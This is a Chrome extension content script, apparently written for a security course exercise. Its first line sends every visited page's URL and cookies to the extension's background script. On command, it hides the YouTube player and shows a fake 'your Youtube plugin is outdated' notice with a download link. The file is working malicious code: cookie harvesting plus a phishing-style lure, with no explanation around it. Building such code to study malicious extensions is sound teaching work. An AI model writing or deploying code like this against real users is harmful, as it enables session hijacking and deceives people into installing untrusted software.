chrome.runtime.sendMessage({url:document.URL, cookie:document.cookie});

chrome.runtime.onMessage.addListener(function(request, sender) {
	//alert("Contentscript has received a message from from background script: '" + request.message + "'");
	console.log(request.action);
	if (request.action === "blockYoutube")
	{
		document.getElementById("player-api").style.display = "none";


		var x = document.getElementsByClassName("player-api player-width player-height")[1];
		console.log(x);
		x.style.backgroundColor = "gray";
		x.style.textAlign = "center";
		x.style.fontSize = "20px";

		var p = document.createElement("p");
		p.style.paddingTop = "40px";
		p.style.color = "white";

		var a = document.createElement('a');
		a.title = "new Youtube plugin";
		a.href = "https://www.securitee.org/teaching/cse509/";

		var br = document.createElement("br");

		var pText = document.createTextNode("Sorry, your Youtube plugin is outdated."); 
		p.appendChild(pText);
		p.appendChild(br);
		pText = document.createTextNode("To download the latest version, please click ");
		p.appendChild(pText);

		var aText = document.createTextNode("HERE.");
		a.appendChild(aText);
		p.appendChild(a);
		
		if (x.firstChild === null)
		{
			x.appendChild(p);
		}
	}
});

